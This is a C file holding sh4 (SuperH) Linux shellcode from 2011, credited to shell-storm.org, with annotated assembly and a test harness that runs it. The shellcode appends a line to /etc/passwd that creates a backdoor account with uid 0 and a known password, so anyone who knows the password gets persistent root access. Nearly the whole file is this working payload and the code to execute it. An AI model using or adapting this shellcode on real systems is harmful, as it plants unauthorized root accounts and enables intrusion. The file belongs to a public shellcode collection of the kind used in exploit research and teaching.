/*
** Title:     Linux/SuperH - sh4 - add root user with password - 143 bytes
** Date:      2011-06-23
** Tested on: debian-sh4 2.6.32-5-sh7751r
** Author:    Jonathan Salwan - twitter: @jonathansalwan
**
** http://shell-storm.org
**
** Informations:
** -------------
**               - user: shell-storm
**               - pswd: toor
**               - uid : 0
**
** open:
**         mov      #5, r3
**         mova     @(130, pc), r0
**         mov      r0, r4
**         mov      #255, r13
**         mov      #4, r12
**         mul.l    r13, r12
**         sts      macl, r5
**         add      #69, r5
**         mov      #84, r13
**         mov      #5, r12
**         mul.l    r13, r12
**         sts      macl, r6
**         trapa    #2
**         mov      r0, r11
**
** write:
**         xor      r6, r6
**         xor      r5, r5
**         mov      #4, r3
**         mov      r11, r4
**         mova     @(20, pc), r0
**         mov      r0, r5
**         mov      #72, r6
**         trapa    #2
**
** close:
**         mov      #6, r3
**         mov      r11, r4
**         trapa    #2
**
** exit:
**         mov      #1, r3
**         xor      r4, r4
**         trapa    #2
**
** user:
**         .string "shell-storm:$1$KQYl/yru$PMt02zUTWmMvPWcU4oQLs/:0:0:root:/root:/bin/bash\n"
**
** file:
**         .string "@@@/etc/passwd"
**
**
** The '@@@' is just for alignment.
**
*/

#include <stdio.h>
#include <string.h>


char *SC =
           /* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND, 0644) = fd */
           "\x05\xe3\x20\xc7\x03\x64\xff\xed"
           "\x04\xec\xd7\x0c\x1a\x05\x45\x75"
           "\x54\xed\x05\xec\xd7\x0c\x1a\x06"
           "\x02\xc3"

           /* r11 = fd */
           "\x03\x6b"

           /* write(fd, "shell-storm:$1$KQYl/yru$PMt02zUTW"..., 72) */
           "\x6a\x26\x5a\x25\x04\xe3\xb3\x64"
           "\x04\xc7\x03\x65\x48\xe6\x02\xc3"

           /* close(fd) */
           "\x06\xe3\xb3\x64\x02\xc3"

           /* exit(0) */
           "\x01\xe3\x4a\x24\x02\xc3"

           /* shell-storm:$1$KQYl/yru$PMt02zUTWmMvPWcU4oQLs/:0:0:root:/root:/bin/bash\n */
           "\x73\x68\x65\x6c\x6c\x2d\x73\x74"
           "\x6f\x72\x6d\x3a\x24\x31\x24\x4b"
           "\x51\x59\x6c\x2f\x79\x72\x75\x24"
           "\x50\x4d\x74\x30\x32\x7a\x55\x54"
           "\x57\x6d\x4d\x76\x50\x57\x63\x55"
           "\x34\x6f\x51\x4c\x73\x2f\x3a\x30"
           "\x3a\x30\x3a\x72\x6f\x6f\x74\x3a"
           "\x2f\x72\x6f\x6f\x74\x3a\x2f\x62"
           "\x69\x6e\x2f\x62\x61\x73\x68\x5c"
           "\x6e"

           /* @@@/etc/passwd */
           "\x40\x40\x40\x2f\x65\x74\x63\x2f"
           "\x70\x61\x73\x73\x77\x64";


int main(void)
{
   fprintf(stdout,"Length: %d\n",strlen(SC));
   (*(void(*)()) SC)();
return 0;
}